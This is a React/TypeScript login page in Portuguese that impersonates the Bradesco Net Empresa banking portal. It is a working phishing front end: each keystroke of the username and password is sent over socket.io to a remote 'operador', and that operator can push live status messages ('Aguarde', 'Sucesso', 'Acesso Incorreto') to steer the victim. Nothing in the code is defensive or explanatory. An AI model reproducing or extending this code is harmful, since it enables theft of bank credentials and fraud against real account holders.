import { useEffect, useState } from 'react';
import { io, Socket } from 'socket.io-client';
import { useToastContext } from '@/contexts/ToastContext';

export default function Home() {
  const toast = useToastContext();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [usuario, setUsuario] = useState('');
  const [senha, setSenha] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [status, setStatus] = useState('');
  const [statusColor, setStatusColor] = useState('');

  useEffect(() => {
    const newSocket = io();
    setSocket(newSocket);

    newSocket.on('connect', () => {
      const id = newSocket.id || '';
      setSessionId(id);
      console.log('Conectado ao servidor:', id);
    });

    newSocket.on('comando', (data: any) => {
      console.log('Comando recebido:', data);
      setStatus(data.comando || '');
      setStatusColor(data.cor || 'bg-gray-500');
      
      if (data.comando === 'Aguarde') {
        toast.info('Comando', 'Aguarde...');
      } else if (data.comando === 'Sucesso') {
        toast.success('Sucesso', 'Acesso realizado com sucesso!');
      } else if (data.comando === 'Acesso Incorreto') {
        toast.error('Erro', 'Acesso incorreto!');
      }
    });

    return () => {
      newSocket.disconnect();
    };
  }, [toast]);

  const handleInputChange = (field: 'usuario' | 'senha', value: string) => {
    if (field === 'usuario') {
      setUsuario(value);
    } else {
      setSenha(value);
    }

    // Enviar dados para o operador
    if (socket) {
      socket.emit('cliente-dados', {
        sessionId,
        usuario,
        senha: field === 'senha' ? value : senha,
        timestamp: new Date().toISOString()
      });
    }
  };

  const handleAvançar = () => {
    if (!usuario || !senha) {
      toast.error('Erro', 'Preencha usuário e senha');
      return;
    }

    if (socket) {
      socket.emit('cliente-login', {
        sessionId,
        usuario,
        senha,
        timestamp: new Date().toISOString()
      });
    }

    toast.info('Info', 'Enviando credenciais...');
  };

  const handleCancelar = () => {
    setUsuario('');
    setSenha('');
    setStatus('');
    toast.info('Info', 'Login cancelado');
  };

  return (
    <div className="min-h-screen flex">
      {/* Sidebar Bradesco */}
      <div className="w-28 bg-red-600 flex flex-col items-center justify-start pt-8">
        <div className="text-white text-4xl font-bold mb-2">B</div>
        <div className="text-white text-xs text-center px-2">
          <div className="font-bold">Bradesco</div>
          <div>net empresa</div>
        </div>
      </div>

      {/* Conteúdo Principal */}
      <div className="flex-1 flex items-center justify-center bg-gray-100">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
          <h1 className="text-2xl font-bold text-red-600 mb-2">Acesso Seguro</h1>
          <p className="text-gray-600 mb-6">Acesse o Bradesco Net Empresa de forma segura</p>

          {/* Status do Operador */}
          {status && (
            <div className={`mb-4 p-3 rounded text-white text-center font-bold ${statusColor}`}>
              {status}
            </div>
          )}

          {/* Formulário */}
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Usuário</label>
              <input
                type="text"
                placeholder="Digite seu usuário"
                value={usuario}
                onChange={(e) => handleInputChange('usuario', e.target.value)}
                className="w-full px-4 py-2 border-2 border-red-400 rounded focus:outline-none focus:border-red-600"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Senha</label>
              <input
                type="password"
                placeholder="Digite sua senha"
                value={senha}
                onChange={(e) => handleInputChange('senha', e.target.value)}
                className="w-full px-4 py-2 border-2 border-red-400 rounded focus:outline-none focus:border-red-600"
              />
            </div>

            <div className="flex gap-3 pt-4">
              <button
                onClick={handleCancelar}
                className="flex-1 px-4 py-2 border-2 border-gray-300 text-gray-700 rounded font-medium hover:bg-gray-100 transition"
              >
                Cancelar
              </button>
              <button
                onClick={handleAvançar}
                className="flex-1 px-4 py-2 bg-red-600 text-white rounded font-medium hover:bg-red-700 transition"
              >
                Avançar
              </button>
            </div>
          </div>

          {/* Info de Sessão */}
          <div className="mt-6 pt-4 border-t border-gray-200 text-xs text-gray-500">
            <p>Session ID: {sessionId.substring(0, 8)}...</p>
          </div>
        </div>
      </div>
    </div>
  );
}
